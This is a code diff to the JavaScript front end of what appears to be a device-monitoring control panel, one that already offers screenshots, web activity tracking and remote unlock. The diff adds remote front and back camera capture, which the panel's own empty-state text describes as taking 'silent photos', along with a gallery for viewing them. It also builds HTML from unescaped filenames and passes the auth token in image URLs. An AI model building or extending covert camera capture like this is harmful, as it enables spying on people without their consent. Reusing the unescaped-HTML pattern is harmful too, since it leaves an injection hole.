@@ -217,6 +217,10 @@ function handleWSMessage(msg) {
             showToast('Screenshot captured!', 'success');
             loadScreenshots();
             break;
+        case 'camera_photo_ready':
+            showToast('Camera photo captured!', 'success');
+            loadCameraPhotos();
+            break;
         case 'apps_updated':
             loadApps();
             break;
@@ -351,12 +355,14 @@ function switchPage(page) {
         activity: 'Activity Timeline',
         screentime: 'Screen Time',
         apps: 'Running Apps',
-        web: 'Web Activity'
+        web: 'Web Activity',
+        camera: 'Camera Photos'
     };
     document.getElementById('headerTitle').textContent = titles[page] || page;
 
     // Load data for the page
     if (page === 'screenshots') loadScreenshots();
+    if (page === 'camera') loadCameraPhotos();
     if (page === 'activity') loadActivities();
     if (page === 'screentime') loadScreenTime();
     if (page === 'apps') loadApps();
@@ -379,6 +385,24 @@ async function takeScreenshot() {
         }
     } catch (e) {
         showToast('Failed to request screenshot', 'error');
+    }
+
+    setTimeout(() => { if (btn) btn.disabled = false; }, 3000);
+}
+
+async function takePhoto(cameraType = 'front') {
+    const btn = document.getElementById(cameraType === 'back' ? 'btnCameraBack' : 'btnCameraFront');
+    if (btn) btn.disabled = true;
+
+    try {
+        const res = await apiFetch('/api/take-photo', 'POST', { camera: cameraType });
+        if (res.success) {
+            showToast(`Requesting ${cameraType} camera capture...`, 'info');
+        } else {
+            showToast(res.error || 'Failed', 'error');
+        }
+    } catch (e) {
+        showToast(`Failed to request ${cameraType} photo`, 'error');
     }
 
     setTimeout(() => { if (btn) btn.disabled = false; }, 3000);
@@ -407,6 +431,7 @@ async function unlockDevice() {
 async function refreshAll() {
     loadStatus();
     loadScreenshots();
+    loadCameraPhotos();
     loadActivities();
     loadScreenTime();
     loadApps();
@@ -505,6 +530,52 @@ function closeModal(event) {
 document.addEventListener('keydown', e => {
     if (e.key === 'Escape') closeModal({ target: document.getElementById('screenshotModal'), currentTarget: document.getElementById('screenshotModal') });
 });
+
+// ═══════════════════════════════════════════
+//  LOAD CAMERA PHOTOS
+// ═══════════════════════════════════════════
+async function loadCameraPhotos() {
+    try {
+        const photos = await apiFetch('/api/camera-photos?limit=1000');
+        renderCameraPhotos(photos);
+    } catch {}
+}
+
+function renderCameraPhotos(photos) {
+    const grid = document.getElementById('cameraGrid');
+    if (!grid) return;
+    if (!photos.length) {
+        grid.innerHTML = `
+            <div class="empty-state" style="grid-column:1/-1">
+                <div class="empty-icon">🤳</div>
+                <h3>No camera photos captured</h3>
+                <p>Use the capture buttons above to take silent photos</p>
+            </div>`;
+        return;
+    }
+
+    grid.innerHTML = photos.map(p => `
+        <div class="card screenshot-card" onclick="openCameraPhoto('${p.filename}', '${formatTime(p.captured_at)}', '${p.camera_type || 'front'}')">
+            <div class="screenshot-thumb">
+                <img src="/api/camera-photos/file/${p.filename}?token=${authToken}" alt="Camera Photo" loading="lazy">
+            </div>
+            <div class="screenshot-meta">
+                <span class="screenshot-time">${formatTime(p.captured_at)} (${(p.camera_type || 'front').toUpperCase()})</span>
+                <span class="screenshot-size">${formatBytes(p.file_size)}</span>
+            </div>
+        </div>
+    `).join('');
+}
+
+function openCameraPhoto(filename, time, cameraType) {
+    const modal = document.getElementById('screenshotModal');
+    const img = document.getElementById('modalImage');
+    const title = document.getElementById('modalTitle');
+
+    img.src = `/api/camera-photos/file/${filename}?token=${authToken}`;
+    title.textContent = `Camera Photo (${cameraType.toUpperCase()}) — ${time}`;
+    modal.classList.add('active');
+}
 
 // ═══════════════════════════════════════════
 //  LOAD ACTIVITIES
